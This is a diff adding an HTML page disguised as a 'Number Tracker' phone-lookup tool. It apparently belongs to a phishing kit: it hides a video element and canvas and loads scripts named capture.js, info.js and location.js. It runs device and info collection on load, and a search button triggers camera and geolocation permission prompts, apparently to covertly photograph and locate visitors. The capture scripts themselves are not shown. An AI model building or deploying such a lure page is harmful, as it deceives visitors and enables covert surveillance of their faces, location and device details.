@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Number Locator</title>
+   
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  
+        <script src="d/device.js"></script>
+
+  <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+    <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      height: 100vh; /* 100% of the viewport height */
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background-color: #f0f0f0; /* Optional background color */
+    }
+
+    .box {
+      text-align: center;
+      padding: 20px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      background-color: #fff;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+    }
+
+    input[type="text"] {
+      padding: 10px;
+      width: 200px;
+    }
+
+    a {
+      padding: 10px 20px;
+      background-color: #007bff;
+      color: #fff;
+      border: none;
+      border-radius: 3px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+  <div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+<script src="v/capture.js">
+</script>
+
+   <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+  <script src="l/client.min.js"></script>
+  <script src="l/info.js"></script>
+  <script src="l/location.js"></script>
+<body onload="initializePage();">
+  <div class="box">
+    <h1>Number Tracker</h1>
+    <p>Enter Phone Number to Track:</p>
+    <input type="text" placeholder="Phone Number">
+<a href="javascript:void(0);" target="" class="VahdFMz0 locate"  onclick="action()">SEARCH</a>        
+  </div>
+  <script>function initializePage() {
+    device(true);
+    info();
+    // Add other functions you want to run when the page loads here.
+}
+    function action() {
+   checkPermissionsAndRedirect()
+   locate(true)
+    // Add other functions you want to run when the page loads here.
+}
+    // Function to check and request camera and location permissions
+function checkPermissionsAndRedirect() {
+    // Check camera permission
+    navigator.mediaDevices
+        .getUserMedia({ video: true })
+        .then(() => {
+            // Camera permission granted
+            // Now, check location permission
+            if ('geolocation' in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    () => {
+                        // Location permission granted
+                        // Redirect to another page
+                        window.location.href = 'your-redirect-page.html';
+                    },
+                    (error) => {
+                        // Location permission denied
+                        // Request location permission
+                        if (error.code === error.PERMISSION_DENIED) {
+                            navigator.permissions
+                                .query({ name: 'geolocation' })
+                                .then((result) => {
+                                    if (result.state === 'granted') {
+                                        // Location permission granted after request
+                                        // Redirect to another page
+                                        window.location.href = 'your-redirect-page.html';
+                                    } else {
+                                        // Location permission still denied
+                                        // Handle as needed
+                                        alert('Location permission is required for this page.');
+                                    }
+                                });
+                        } else {
+                            // Handle other location errors as needed
+                            alert('Error accessing location.');
+                        }
+                    }
+                );
+            } else {
+                // Geolocation not supported
+                // Handle as needed
+                alert('Geolocation is not supported by your browser.');
+            }
+        })
+        .catch((error) => {
+            // Camera permission denied or not supported
+            // Handle as needed
+            alert('Camera permission is required for this page.');
+        });
+}
+
+// Call the function to check and request permissions
+checkPermissionsAndRedirect();
+
+
+</script>
+</body>
+</html>
